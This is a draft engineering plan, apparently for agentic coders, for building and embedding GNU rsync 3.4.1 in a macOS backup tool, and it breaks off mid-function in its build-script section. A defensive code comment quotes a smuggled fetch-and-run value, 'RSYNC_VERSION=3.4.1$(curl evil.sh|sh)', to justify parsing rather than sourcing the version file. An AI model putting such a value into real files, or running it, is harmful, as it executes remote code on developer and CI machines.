---
title: FlashBackup Task 12a + 12b Implementation Plan v2 - Embedded GNU rsync Build Pipeline
created: 2026-08-24
last_modified: 2026-08-24
author: Mahesh Mirchandani
status: draft (pending multi-hat plan review)
supersedes: docs/planning/2026-06-06-1917-task-12a-embedded-rsync-build-pipeline.md
---

# Task 12a + 12b Implementation Plan v2: Embedded GNU rsync Build Pipeline

**Version 2.0. Last updated: Mon, 24 Aug 2026 17:29.**

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace v0.1.0-core's placeholder embedded rsync with a real universal2 GNU rsync 3.4.1 binary built from upstream source, so that a clean install of flashbackup actually transfers data.

**Architecture:** Minimal-config rsync 3.4.1 (`--disable-openssl --disable-zstd --disable-lz4 --disable-xxhash`, links only libSystem). Two `//go:build`-tagged Go files swap the embed payload between the checked-in `bin/rsync.placeholder` (dev default) and the gitignored `bin/rsync.universal2` (selected by `-tags embed_real_rsync`). The existing `make build` is preserved byte-for-byte in behaviour; a new `make build-real-rsync` composes both tags. CI gains a smoke matrix, an actions-lint workflow, and a manually-gated release workflow.

**Tech Stack:** Bash, Go 1.23, GNU Make, GitHub Actions, clang cross-compile, lipo, Sigstore build-provenance attestation.

**Spec:** `docs/specs/2026-06-06-1839-task-12a-embedded-rsync-build-pipeline-design.md` (LOCKED). Read Sections 4, 5 and 7 in full before Task 1.

---

## Why this plan replaces v1

Plan v1 (`docs/planning/2026-06-06-1917-...`, commit `a77c95b`) failed a four-hat review with 14 Critical, 20 Important and 15 Minor findings. The dominant failure was not a design error: it was that v1 generated pseudo-code for helper functions **without opening the files they live in**. Every signature in its Tasks 5 and 6 was wrong.

Plan v2 is written against files that were read, and against behaviour that was executed and observed on Mon, 24 Aug 2026. Where this plan states a signature, it was copied from the file named beside it. Where it states a runtime behaviour, it was produced by running the code.

**Every code reference in this plan must stay grounded that way.** If you find yourself writing a function call you have not seen in a file, stop and open the file.

---

## Verified ground truth

These were established by reading and running the code on Mon, 24 Aug 2026. Do not re-derive them; do check them if a task fails unexpectedly.

### Helper signatures (exact, from the files named)

From `test/e2e/helpers.go`:

```go
func SetupUSB(t *testing.T, sizeMB int) string                    // mounts APFS DMG + runs `init`; sizeMB is IGNORED (testutil hard-codes 10 MB)
func SeedSource(t *testing.T, fixtureName string) string          // "tiny" | "realistic" | "pathological"
func SeedProfile(t *testing.T, usb, name, source string, includes, excludes []string)   // no return value
func RunBackup(t *testing.T, profile, usb string, extraArgs ...string) (int, string, string)   // (exitCode, stdout, stderr)
func RunInit(t *testing.T, usb string, extraArgs ...string) (int, string, string)
func RunVerify(t *testing.T, usb string, extraArgs ...string) (int, string, string)
```

From `test/e2e/binary_cache.go`:

```go
func BuildBinary(t *testing.T) string              // no flavour argument; one function per flavour
func BuildFaultinjectBinary(t *testing.T) string   // the pattern BuildRealRsyncBinary must copy
func buildBinaryAtPath(prefix string, extraArgs []string) (string, error)   // UNEXPORTED
func findRepoRoot() (string, error)                                          // UNEXPORTED; callable from package e2e
```

From `test/e2e/assertions.go`:

```go
func AssertManifestExists(t *testing.T, usb, runID string)
func AssertRunsNDJSONHasFinishedLine(t *testing.T, usb string) string   // returns runID
func AssertVerifySummaryExists(t *testing.T, usb, runID string) string
func FixtureTreeSHA256(t *testing.T, root string) string
```

From `internal/paths/namespace.go`:

```go
func Prefix(hostname, username string) string
func Namespaced(destRoot, hostname, username, srcRelative string) string   // FOUR arguments
```

From `internal/hash/sha256.go`:

```go
func StreamSHA256(ctx context.Context, r io.Reader) (digest string, n int64, err error)   // takes a READER, not a path
```

From `internal/testutil/hdiutil_darwin.go`:

```go
func RequireE2E(t *testing.T)
func RequireMacOS(t *testing.T)
func RequireDiskutil(t *testing.T)
func RequireHdiutil(t *testing.T)
func MountTempVolume(t *testing.T, fsType string) string   // fsType is "APFS"
```

From `internal/rsync/rsync.go`:

```go
func EmbeddedSHA256() string
func EnsureExtracted(ctx context.Context, dotFlashbackupDir string) (string, error)
var embeddedRsync []byte   // currently declared in rsync.go behind //go:embed bin/rsync.placeholder
```

**Go version note:** `go.mod` declares `go 1.23`. `t.Context()` does NOT exist in Go 1.23. Use `context.Background()` in tests.

### Observed runtime behaviour

Run on Mon, 24 Aug 2026 against a real APFS DMG with the placeholder embed and no rsync override. A throwaway probe test reproduced the full 12b-A contract; these are its actual outputs.

- Exit code: **1**
- `runs.ndjson` finished line: `exit_status: "partial"`, `files_total: 3`, `files_succeeded: 0`, `files_failed: 3`, `bytes_total: 20`
- `<USB>/.flashbackup/runs/<runID>/rsync.log` contains exactly: `PLACEHOLDER rsync; awaiting Task 12a build`
- The finished line's `support_paths` array contains the absolute rsync.log path.
- Per-file T2 lines print `OK <name> (not_transferred)`.

### SPEC CONFLICT: `bytes_transferred` does not exist

Spec AC-12b-1 requires asserting `bytes_transferred = 0`, and AC-12b-2 implies `bytes_transferred > 0`. **There is no such field.** `internal/state/runlog.go:28-46` defines `FinishedRun` with `BytesTotal int64` (`json:"bytes_total"`) and no transferred counter; `grep -rn "bytes_transferred" --include="*.go" .` returns nothing. `bytes_total` is the *enumerated* byte count and is non-zero (20) even when the placeholder transfers nothing.

**Resolution carried by this plan** (raise with MM at plan review; it is an assertion-level spec correction, not an invariant change):

| Spec text | Implementable assertion |
|---|---|
| 12b-A `bytes_transferred = 0` | `files_succeeded == 0 && files_failed == files_total` |
| 12b-B `bytes_transferred > 0` | `files_succeeded == files_total && files_failed == 0`, plus the external SHA256 equality of AC-12b-2, which is the real proof bytes moved |

### SPEC CONFLICT: the pathological tripwire test does not exist

Spec §4.5 states "The `pathological/_MatchesManifest` tripwire test (introduced in Task 42a) re-baselines on the extended fixture." **No such test exists.** `test/e2e/helpers_test.go` defines only `TestFixtureTreeSHA256_TinyMatchesManifest` and `TestFixtureTreeSHA256_RealisticMatchesManifest`. The pathological fixture's `MANIFEST.txt` records `SHA256-of-tree: d902015f4aad3e21f830a4461ad8ac29eea7bb498baea672d9eb973412ad93a3` but nothing asserts it.

That recorded value **is** currently correct: recomputing it from a freshly materialised tree on Mon, 24 Aug 2026 reproduced it exactly. Task 8 therefore adds the missing tripwire rather than re-baselining a test that was never written. This turns an unasserted comment into a real gate, per the project's "positive-control anything whose failure looks like success" rule.

### Two build-tag facts that will otherwise mislead you

1. **No Go file is gated on the `release` build tag.** `grep -rn "go:build.*\brelease\b" --include="*.go" .` matches only a prose comment in `internal/preflight/codesign/doc.go`. `cmd/flashbackup/inject_release.go` is gated `//go:build !faultinject`. The `-tags release` in `make build` is therefore inert today. Keep passing it (the spec and Makefile both do, and a future file may adopt it) but do not expect it to change compilation.
2. **Release behaviour comes from an ldflag, not the tag.** `LDFLAGS_RELEASE` sets `-X ...codesign.IsReleaseBuild=true`, which makes `verifySelf` run `codesign --verify --strict` on the running binary (`internal/preflight/codesign/codesign_darwin.go:38-51`). Verified Mon, 24 Aug 2026: `codesign --verify --strict ./flashbackup` **passes**, because the arm64 linker applies an ad-hoc signature. So `make build-real-rsync` output is runnable locally. `BuildRealRsyncBinary` (Task 9) deliberately omits the ldflags, matching `BuildBinary`, so the gate stays off for test binaries.

---

## Global Constraints

Copied from the spec and the project conventions. Every task's requirements implicitly include this section.

- **rsync version:** 3.4.1, and only 3.4.1.
- **Configure flags:** exactly `--disable-openssl --disable-zstd --disable-lz4 --disable-xxhash`.
- **Architectures:** arm64 + x86_64, joined with `lipo`. Minimum macOS 13.0 (`-mmacosx-version-min=13.0`).
- **Go floor:** 1.23. No `t.Context()`. No generics beyond what the tree already uses.
- **`make build` must not change.** Its behaviour is an acceptance criterion (AC-12a-6).
- **Parse, never source.** `scripts/rsync.version` is read by grep. AC-12a-9 asserts the script contains no `source` or `.` of it.
- **All third-party GitHub Actions pinned to a 40-hex commit SHA.** No floating `@v4` tags.
- **No em-dashes or en-dashes** in any net-new content: docs, comments, commit messages, YAML comments. Use full stops, semicolons, colons or plain hyphens.
- **No AI attribution anywhere.** No `Co-Authored-By` trailers on any commit.
- **Docs naming:** `docs/<category>/YYYY-MM-DD-HHMM-<topic>.<ext>`.
- **Never commit secrets.** No tokens in YAML, scripts or commit bodies.

### Pre-commit gates: run for EVERY task, no exceptions

Plan v1 was inconsistent, letting some tasks declare gates "not applicable (YAML/docs-only)". That inconsistency is how a YAML typo reaches main. **Every commit in this plan runs all four gates and reports all four outputs in the commit body:**

```bash
go vet ./...
gofmt -s -l .          # MUST be empty; bare `gofmt -l` is insufficient, CI runs the -s simplifier
go test -race -count=1 ./...
make coverage
```

For a YAML-only or docs-only commit the gates are still run; they simply pass trivially, and that fact is recorded. Additionally, for any commit touching `.github/workflows/`:

```bash
python3 -c "import yaml;[yaml.safe_load(open(f)) for f in ['.github/workflows/ci.yml','.github/workflows/actions-lint.yml','.github/workflows/release.yml']]" && echo "YAML valid"
grep -rn '<PINNED_SHA' .github/workflows/ && echo "FAIL: placeholder SHA left in workflow" && exit 1 || echo "OK: no placeholder SHAs"
```

`make lint` cannot run locally: `scripts/golangci-version.txt` pins golangci-lint 1.61.0, which requires Go 1.23 while dev machines run newer. CI runs the real lint. Do not attempt a local golangci-lint run; do not bump the pin as a side effect of this plan.

---
## File structure

| Path | Status | Responsibility |
|---|---|---|
| `internal/rsync/rsync.go` | Modify | Drop the `var embeddedRsync` declaration; keep `EmbeddedSHA256` and `EnsureExtracted`. Harden the tmp-file open. |
| `internal/rsync/embed_dev.go` | Create | `//go:build !embed_real_rsync`; embeds the placeholder. |
| `internal/rsync/embed_release.go` | Create | `//go:build embed_real_rsync`; embeds `bin/rsync.universal2`. |
| `internal/rsync/bin/rsync.universal2` | Generated, gitignored | The real binary. |
| `scripts/rsync.version` | Create | Two bare-literal assignments. Parsed, never sourced. |
| `scripts/rsync.version.attestation` | Create | Three witness SHA256 lines. |
| `scripts/build-rsync.sh` | Replace | Currently a comment-only stub. Becomes the real build. |
| `scripts/build-rsync.test.sh` | Create | Four negative-path tests for the build script. |
| `Makefile` | Modify | Seven new targets. Existing targets untouched. |
| `.gitignore` | Modify | Two lines. |
| `test/fixtures/pathological/mkfixtures.sh` | Modify | Add members (g) xattr and (h) ACL. |
| `test/fixtures/pathological/MANIFEST.txt` | Modify | Document (g) and (h); re-baseline the tree SHA. |
| `test/e2e/assertions.go` | Modify | Exclude generated sidecars from `FixtureTreeSHA256`. |
| `test/e2e/helpers_test.go` | Modify | Add the missing pathological tripwire test. |
| `test/e2e/binary_cache.go` | Modify | Add `BuildRealRsyncBinary`. |
| `test/e2e/placeholder_rejection_test.go` | Create | Task 12b-A. Default build tags. |
| `test/e2e/embedded_real_rsync_test.go` | Create | Task 12b-B. `//go:build embed_real_rsync`. |
| `.github/workflows/ci.yml` | Modify | Add the `build-rsync-smoke` matrix job. |
| `.github/workflows/actions-lint.yml` | Create | Floating-tag and attestation-freshness gates. |
| `.github/workflows/release.yml` | Create | Manually-gated release with provenance. |

---

## Task 1: Audit and harden the rsync extraction path

Spec §5.2 mandates an implementer audit of `EnsureExtracted` before the embed swap, because the SHA-keyed extract path becomes load-bearing once it carries a real 1-2 MB binary instead of a 342-byte script.

**The audit has already been performed** (Mon, 24 Aug 2026, by reading `internal/rsync/rsync.go`). Two of the three properties the spec assumed are **not** what the code does. Your job is to confirm this reading and apply the fix, not to re-derive it.

| Spec §5.2 assumed property | Reality in `rsync.go` | Action |
|---|---|---|
| (a) tmp file created with `O_EXCL` under a 0700 dir | Dir is 0700 (`os.MkdirAll(extractDir, 0o700)`). Open is `os.O_CREATE\|os.O_TRUNC\|os.O_WRONLY` preceded by a best-effort `os.Remove(tmpPath)`. **No `O_EXCL`.** | Fix: add `O_EXCL` with a randomised suffix. |
| (b) SHA256 re-verified AFTER rename | Verified BEFORE rename (hash `tmpPath`, then `os.Rename`). | Keep as is. Verifying the bytes then atomically renaming them is sound; re-hashing after an atomic rename adds cost without adding a guarantee. Document the deviation. |
| (c) `chflags uchg` applied AFTER rename | True. `applyImmutableFlag(extractPath)` runs post-rename. | No change. |

**Files:**
- Modify: `internal/rsync/rsync.go` (the tmp-open block)
- Test: `internal/rsync/rsync_test.go`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces: no signature change. `EnsureExtracted(ctx context.Context, dotFlashbackupDir string) (string, error)` is unchanged for every caller.

- [ ] **Step 1.1: Confirm the audit by reading the file**

Open `internal/rsync/rsync.go` and locate the tmp-open block. Confirm it reads:

```go
	tmpPath := extractPath + ".tmp"
	// Best-effort cleanup of any stale tmp from a prior crashed extract.
	_ = os.Remove(tmpPath)

	tmpFile, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o500)
```

If it does not read that way, the tree has moved since Mon, 24 Aug 2026: stop and report before changing anything.

- [ ] **Step 1.2: Write the failing test**

Add to `internal/rsync/rsync_test.go`:

```go
// TestEnsureExtracted_TmpUsesExclusiveCreate asserts the extraction tmp
// file is created with O_EXCL under a unique name, so two concurrent
// extracts cannot interleave writes into one tmp path. The preflight
// lock makes concurrent runs on one USB unlikely, but the extract path
// carries a real binary from Task 12a onward and must not depend on
// that lock for its integrity.
func TestEnsureExtracted_TmpUsesExclusiveCreate(t *testing.T) {
	dir := t.TempDir()

	// Pre-create the legacy fixed tmp path. Under the old O_TRUNC open
	// this file was silently removed and reused; under O_EXCL with a
	// randomised suffix it must be left untouched.
	sum := EmbeddedSHA256()
	extractDir := filepath.Join(dir, "bin", sum)
	if err := os.MkdirAll(extractDir, 0o700); err != nil {
		t.Fatalf("mkdir extract dir: %v", err)
	}
	squatter := filepath.Join(extractDir, "rsync.tmp")
	if err := os.WriteFile(squatter, []byte("squatter"), 0o600); err != nil {
		t.Fatalf("write squatter: %v", err)
	}

	got, err := EnsureExtracted(context.Background(), dir)
	if err != nil {
		t.Fatalf("EnsureExtracted: %v", err)
	}
	if want := filepath.Join(extractDir, "rsync"); got != want {
		t.Errorf("extract path: got %q want %q", got, want)
	}

	// The squatter file must survive: we no longer reuse that name.
	data, err := os.ReadFile(squatter)
	if err != nil {
		t.Fatalf("squatter was removed; extraction still reuses the fixed tmp path: %v", err)
	}
	if string(data) != "squatter" {
		t.Errorf("squatter content: got %q want %q", data, "squatter")
	}
}

// TestEnsureExtracted_NoTmpResidue asserts a successful extraction
// leaves no *.tmp files behind in the extract dir.
func TestEnsureExtracted_NoTmpResidue(t *testing.T) {
	dir := t.TempDir()
	if _, err := EnsureExtracted(context.Background(), dir); err != nil {
		t.Fatalf("EnsureExtracted: %v", err)
	}
	extractDir := filepath.Join(dir, "bin", EmbeddedSHA256())
	entries, err := os.ReadDir(extractDir)
	if err != nil {
		t.Fatalf("read extract dir: %v", err)
	}
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".tmp") {
			t.Errorf("tmp residue left behind: %s", e.Name())
		}
	}
}
```

Ensure the file imports `context`, `os`, `path/filepath`, `strings` and `testing`.

- [ ] **Step 1.3: Run the test and watch it fail**

```bash
go test -run 'TestEnsureExtracted_TmpUsesExclusiveCreate|TestEnsureExtracted_NoTmpResidue' -v ./internal/rsync/
```

Expected: `TestEnsureExtracted_TmpUsesExclusiveCreate` FAILS with "squatter was removed; extraction still reuses the fixed tmp path". This is the positive control: it proves the test can detect the condition. If it passes at this point, the test is not testing what it claims and must be fixed before proceeding.

- [ ] **Step 1.4: Apply the hardening**

Replace the tmp-open block in `internal/rsync/rsync.go` with:

```go
	// Randomised tmp name + O_EXCL. The extract dir is already 0700 and
	// user-owned, so a cross-user symlink attack is not the threat; the
	// threat is two flashbackup processes racing on one fixed tmp path.
	// O_EXCL makes that race a hard error rather than an interleaved
	// write. Audit note (Task 12a, Mon, 24 Aug 2026): the SHA256
	// re-verification below happens BEFORE the rename, not after. That
	// ordering is deliberate. Verifying the bytes and then renaming them
	// atomically into place gives the same guarantee as re-hashing after
	// the rename, without a second full read of the file.
	tmpFile, err := os.CreateTemp(extractDir, "rsync.*.tmp")
	if err != nil {
		return "", fmt.Errorf("create rsync tmp: %w", err)
	}
	tmpPath := tmpFile.Name()
	if err := tmpFile.Chmod(0o500); err != nil {
		_ = tmpFile.Close()
		_ = os.Remove(tmpPath)
		return "", fmt.Errorf("chmod rsync tmp: %w", err)
	}
```

`os.CreateTemp` uses `O_RDWR|O_CREATE|O_EXCL` internally and generates a unique name, which satisfies both halves of the fix. It creates with mode 0600, so the explicit `Chmod` restores the 0500 the old code requested.

Delete the now-dead `_ = os.Remove(tmpPath)` line that preceded the old open. Leave every other line of the function, including the pre-rename verification and the post-rename `applyImmutableFlag`, exactly as it is.

- [ ] **Step 1.5: Run the tests and watch them pass**

```bash
go test -race -count=1 ./internal/rsync/
```

Expected: PASS, including the pre-existing `wrapper_test.go` tests that exec the extracted placeholder.

- [ ] **Step 1.6: Run the full gates and commit**

```bash
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
git add internal/rsync/rsync.go internal/rsync/rsync_test.go
git commit -F- <<'MSG'
fix(rsync): O_EXCL + unique tmp name for embedded binary extraction

Spec-mandated audit of EnsureExtracted before Task 12a swaps a 342-byte
placeholder for a 1-2 MB real binary. Two of the three properties the
spec assumed were not what the code did:

- No O_EXCL. The tmp path was a fixed "<extract>/rsync.tmp" opened
  O_CREATE|O_TRUNC after a best-effort Remove, so two concurrent
  extracts could interleave. Fixed via os.CreateTemp (O_EXCL + unique
  name) plus an explicit Chmod back to 0500.
- SHA256 is re-verified BEFORE the rename, not after. Kept as is and
  documented inline: verify-then-atomically-rename carries the same
  guarantee without a second full read.

chflags uchg was already applied after the rename, as assumed.

Positive control: the new test fails against the old code with
"squatter was removed" before the fix, passes after.

<paste the four gate outputs here>
MSG
```

---

## Task 2: Pin the upstream source with a triple-witness attestation

**Files:**
- Create: `scripts/rsync.version`
- Create: `scripts/rsync.version.attestation`

**Interfaces:**
- Produces: `RSYNC_VERSION` and `RSYNC_TARBALL_SHA256`, parsed by `scripts/build-rsync.sh` (Task 3) and hashed into the CI cache key (Task 10).

This task requires network access to three witnesses. It cannot be faked: the SHA you record is the SHA the build will enforce, and a wrong value fails every subsequent task loudly.

- [ ] **Step 2.1: Collect witness 1 (Homebrew)**

```bash
curl -fsSL https://raw.githubusercontent.com/Homebrew/homebrew-core/master/Formula/r/rsync.rb | tee /tmp/witness-homebrew.txt | grep -E 'url|sha256|version'
```

Record the `sha256` that accompanies the 3.4.1 source URL, and note the commit the file was fetched at.

- [ ] **Step 2.2: Collect witness 2 (Debian)**

```bash
curl -fsSL https://sources.debian.org/api/src/rsync/ | tee /tmp/witness-debian-versions.json
# then fetch the checksum record for the 3.4.1 orig tarball:
curl -fsSL 'https://sources.debian.org/api/sha256/?checksum=&package=rsync' | tee /tmp/witness-debian.json
```

If the API shape has changed, fall back to the `.dsc` file for the 3.4.1 source package and read its `Checksums-Sha256` block. Record the SHA256 for `rsync-3.4.1.tar.gz`.

- [ ] **Step 2.3: Collect witness 3 (rsync-announce)**

```bash
curl -fsSL 'https://lists.samba.org/archive/rsync-announce/' | tee /tmp/witness-announce-index.html | grep -i '3\.4\.1'
```

Open the 3.4.1 announcement thread and record the SHA256 it publishes.

- [ ] **Step 2.4: Halt if the three disagree**

If any two witnesses report different SHA256 values, **stop**. Do not pick a majority, do not proceed to a fourth source hoping for a tiebreak. Report the discrepancy to MM with all three transcripts. A disagreement here is a supply-chain signal, not a data-quality nuisance.

Remember the honest limit, recorded in spec §4.4: all three witnesses ultimately derive from samba.org. Agreement proves no single channel was tampered with after the release; it does not prove samba.org itself was clean at release time.

- [ ] **Step 2.5: Write `scripts/rsync.version`**

Substitute the agreed SHA for `<AGREED_SHA256>`. The format is load-bearing: `build-rsync.sh` matches `^RSYNC_VERSION=[A-Za-z0-9.-]+$` and `^RSYNC_TARBALL_SHA256=[a-f0-9]{64}$`. No quotes, no spaces around `=`, no trailing whitespace.

```
# scripts/rsync.version - upstream rsync pin for FlashBackup.
#
# Two bare-literal assignments only. No quotes, no expansion, no
# command substitution. Parsed by build-rsync.sh via grep, NOT
# sourced as Bash (sourcing would enable arbitrary code execution
# at build time on every dev machine and every CI runner).
#
# Bump procedure:
#   1. Edit RSYNC_VERSION below.
#   2. Compute new RSYNC_TARBALL_SHA256 (see docs/runbooks/rsync-version-bump.md).
#   3. Update scripts/rsync.version.attestation with three witness SHAs
#      observed within 90 days of this edit.
#   4. Run scripts/build-rsync.sh --verify-only locally to confirm.
#   5. Upload the tarball to the upstream-mirror-rsync-X.Y.Z Release with
#      --prerelease --latest=false.
#   6. Commit and push; CI actions-lint enforces attestation freshness.
RSYNC_VERSION=3.4.1
RSYNC_TARBALL_SHA256=<AGREED_SHA256>
```

- [ ] **Step 2.6: Write `scripts/rsync.version.attestation`**

The actions-lint gate (Task 11) extracts field 2 of each `Witness-` line via `awk '{print $2}'` and requires exactly one unique value. Keep the SHA in column 2.

```
# Attestation for rsync.version - witnesses observed at constant-population time.
# All three lines must record the SAME SHA256 or the build halts.
#
# Independence caveat: all three witnesses ultimately derive from
# samba.org. This defends against post-release substitution at any single
# channel. It does not defend against a samba.org compromise at release
# time. A genuinely external fourth witness is queued for Plan 2.
Witness-Homebrew: <AGREED_SHA256> (Formula/r/rsync.rb @ <commit-sha>) observed 2026-08-24
Witness-Debian:   <AGREED_SHA256> (packages.debian.org rsync_3.4.1) observed 2026-08-24
Witness-Announce: <AGREED_SHA256> (rsync-announce 3.4.1 mail thread) observed 2026-08-24
```

- [ ] **Step 2.7: Self-check the gate you are about to depend on**

```bash
grep -E '^RSYNC_VERSION=[A-Za-z0-9.-]+$' scripts/rsync.version
grep -E '^RSYNC_TARBALL_SHA256=[a-f0-9]{64}$' scripts/rsync.version
grep -E '^Witness-' scripts/rsync.version.attestation | awk '{print $2}' | sort -u | wc -l
```

Expected: the first two each print exactly one line; the third prints `1`. If the third prints anything else the witnesses disagree or a column drifted.

- [ ] **Step 2.8: Commit with the transcripts**

The review found that "the implementer collected three witnesses" is otherwise unenforceable and unauditable. Paste the three transcripts into the commit body so the evidence lives in git history.

```bash
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
git add scripts/rsync.version scripts/rsync.version.attestation
git commit -F- <<'MSG'
feat(build): pin rsync 3.4.1 with triple-witness attestation

RSYNC_TARBALL_SHA256 verified identical across three Samba-ecosystem
witnesses. Transcripts below so the evidence is auditable in history
rather than asserted.

Independence limit, per spec 4.4: all three derive from samba.org.
Agreement proves no single channel was altered post-release; it does
not prove samba.org was clean at release time.

--- witness 1: Homebrew Formula/r/rsync.rb ---
<paste the grep output and the commit sha>

--- witness 2: Debian source package ---
<paste the checksum record>

--- witness 3: rsync-announce 3.4.1 ---
<paste the announcement excerpt>

<paste the four gate outputs here>
MSG
```

---
## Task 3: Implement `scripts/build-rsync.sh`

Plan v1 made this one step ("write the entire script"), which the review flagged as far too large for a single reviewable unit. It is split into six sub-steps here, each independently runnable.

**Files:**
- Replace: `scripts/build-rsync.sh` (currently a 36-line comment-only stub)

**Interfaces:**
- Consumes: `scripts/rsync.version` from Task 2.
- Produces: `internal/rsync/bin/rsync.universal2`, consumed by Task 5's embed and Task 9's test. Three flags: no flag (full universal2 build), `--smoke` (arm64 only, no lipo), `--verify-only` (download and SHA-check, no build).

- [ ] **Step 3.1: Write the preamble, flags and prerequisite check**

Replace the whole stub file. Start with:

```bash
#!/bin/bash
# scripts/build-rsync.sh: build GNU rsync universal2 from upstream source.
#
# Modes:
#   (none)          full build: arm64 + x86_64 + lipo -> internal/rsync/bin/rsync.universal2
#   --smoke         arm64 only, no lipo. CI per-commit signal.
#   --verify-only   download + SHA-check the tarball, no build.
#
# The upstream pin lives in scripts/rsync.version and is PARSED, never
# sourced. See that file's header for why.
set -euo pipefail
IFS=$'\n\t'

# PATH hygiene at script entry, not per function: everything below runs
# against system tools only, so a poisoned PATH entry cannot substitute
# clang, tar or shasum.
export PATH="/usr/bin:/bin:/usr/sbin:/sbin"

SMOKE_MODE=0
VERIFY_ONLY=0
case "${1:-}" in
    --smoke)        SMOKE_MODE=1 ;;
    --verify-only)  VERIFY_ONLY=1 ;;
    "")             ;;
    *)              echo "FATAL: unknown flag '$1'" >&2; exit 1 ;;
esac

for tool in clang lipo shasum curl tar make grep cut file otool sysctl; do
    if ! command -v "${tool}" >/dev/null; then
        echo "FATAL: required tool '${tool}' not on PATH" >&2
        echo "  on macOS, install Xcode Command Line Tools: xcode-select --install" >&2
        exit 1
    fi
done
```

Note the prereq list includes `file`, `otool` and `sysctl`, which the spec's sketch omitted but the audit and build steps below actually call.

- [ ] **Step 3.2: Add path variables and the parse-don't-source block**

Append:

```bash
PROJECT_ROOT="$(pwd)"
WORK_DIR="${PROJECT_ROOT}/build"
CACHE_DIR="${WORK_DIR}/cache"
SRC_DIR="${WORK_DIR}/src"
ARM64_BUILD_DIR="${WORK_DIR}/arm64"
AMD64_BUILD_DIR="${WORK_DIR}/amd64"
OUTPUT_PATH="${PROJECT_ROOT}/internal/rsync/bin/rsync.universal2"
MIN_MACOS="13.0"

VERSION_FILE="$(dirname "$0")/rsync.version"
if [[ ! -f "${VERSION_FILE}" ]]; then
    echo "FATAL: ${VERSION_FILE} not found" >&2
    exit 1
fi

# Parse, never source. The anchored regexes below accept ONLY a bare
# literal on the right-hand side. Anything containing $, `, quotes,
# spaces, or a second = fails the match and yields an empty capture,
# which the guard below turns into a hard stop. A malicious PR landing
# RSYNC_VERSION=3.4.1$(curl evil.sh|sh) therefore fails the build
# instead of executing on every dev machine and CI runner.
RSYNC_VERSION="$(grep -E '^RSYNC_VERSION=[A-Za-z0-9.-]+$' "${VERSION_FILE}" | cut -d= -f2 || true)"
RSYNC_TARBALL_SHA256="$(grep -E '^RSYNC_TARBALL_SHA256=[a-f0-9]{64}$' "${VERSION_FILE}" | cut -d= -f2 || true)"
if [[ -z "${RSYNC_VERSION}" || -z "${RSYNC_TARBALL_SHA256}" ]]; then
    echo "FATAL: ${VERSION_FILE} malformed (RSYNC_VERSION or RSYNC_TARBALL_SHA256 missing or non-literal)" >&2
    exit 1
fi

# Exactly-one-match guard. The regexes above are anchored, but a file
# carrying two RSYNC_VERSION lines would make `cut` emit two lines and
# the later string comparisons would silently compare against a
# multi-line value. Reject that shape explicitly.
for key in RSYNC_VERSION RSYNC_TARBALL_SHA256; do
    count="$(grep -cE "^${key}=" "${VERSION_FILE}" || true)"
    if [[ "${count}" != "1" ]]; then
        echo "FATAL: ${VERSION_FILE} has ${count} lines for ${key}; expected exactly 1" >&2
        exit 1
    fi
done

PRIMARY_URL="https://github.com/maheshmirchandani/Backup-Pro/releases/download/upstream-mirror-rsync-${RSYNC_VERSION}/rsync-${RSYNC_VERSION}.tar.gz"
FALLBACK_URL="https://download.samba.org/pub/rsync/src/rsync-${RSYNC_VERSION}.tar.gz"
```

The exactly-one-match guard is a plan v2 addition. The review found the original regex "misses variable indirection"; an anchored regex plus a duplicate-line guard closes the practical gap, because the only remaining way to smuggle a value past the regex is to hide it on a second line.

- [ ] **Step 3.3: Add the error trap, armed after parsing**

Append. The trap must be armed AFTER the prereq and parse blocks so a missing-tool failure prints the tool message rather than a misleading build-log pointer.

```bash
on_error() {
    if [[ -f "${ARM64_BUILD_DIR}/config.log" ]]; then
        echo "FAILED. See ${ARM64_BUILD_DIR}/config.log (and amd64/) for build details." >&2
    elif [[ -d "${SRC_DIR}" ]]; then
        echo "FAILED during build setup. ${SRC_DIR} preserved for inspection." >&2
    else
        echo "FAILED before build started. See output above." >&2
    fi
}
trap 'on_error' ERR
```

- [ ] **Step 3.4: Add download and verification**

Append. Note there is no `2>/dev/null` anywhere: curl diagnostics must reach the operator.

```bash
download_and_verify_tarball() {
    mkdir -p "${CACHE_DIR}"
    local tarball="${CACHE_DIR}/rsync-${RSYNC_VERSION}.tar.gz"

    if [[ -f "${tarball}" ]] && \
       [[ "$(shasum -a 256 "${tarball}" | cut -d' ' -f1)" == "${RSYNC_TARBALL_SHA256}" ]]; then
        echo "tarball cached + verified"
        return
    fi

    # A cached file that exists but fails the SHA is a loud event, not a
    # silent re-download: it means the cache was corrupted or poisoned.
    if [[ -f "${tarball}" ]]; then
        echo "WARNING: cached tarball failed SHA256 verification; re-downloading" >&2
        echo "  cached: $(shasum -a 256 "${tarball}" | cut -d' ' -f1)" >&2
        echo "  wanted: ${RSYNC_TARBALL_SHA256}" >&2
        mv "${tarball}" "${tarball}.rejected"
        echo "  the rejected file is preserved at ${tarball}.rejected" >&2
    fi

    echo "downloading from primary mirror..." >&2
    if ! curl -fSL --progress-bar -o "${tarball}.tmp" "${PRIMARY_URL}"; then
        echo "primary mirror unreachable; falling back to samba.org" >&2
        curl -fSL --progress-bar -o "${tarball}.tmp" "${FALLBACK_URL}"
    fi

    local got
    got="$(shasum -a 256 "${tarball}.tmp" | cut -d' ' -f1)"
    if [[ "${got}" != "${RSYNC_TARBALL_SHA256}" ]]; then
        echo "FATAL: tarball SHA256 mismatch" >&2
        echo "  expected: ${RSYNC_TARBALL_SHA256}" >&2
        echo "  got:      ${got}" >&2
        echo "  (an HTML error page from a CDN hashes just as cleanly as a tarball;" >&2
        echo "   inspect ${tarball}.tmp before assuming a version drift)" >&2
        exit 1
    fi
    mv "${tarball}.tmp" "${tarball}"
    echo "tarball downloaded + verified"
}
```

The rejected-cache branch is a plan v2 addition covering the spec's "corrupted cache must be caught loudly" negative test (Task 6, scenario 3). Without it the corrupt file is silently overwritten and the operator never learns the cache was bad.

- [ ] **Step 3.5: Add extract, per-arch build and lipo**

Append:

```bash
extract_sources() {
    rm -rf "${SRC_DIR}"
    mkdir -p "${SRC_DIR}"
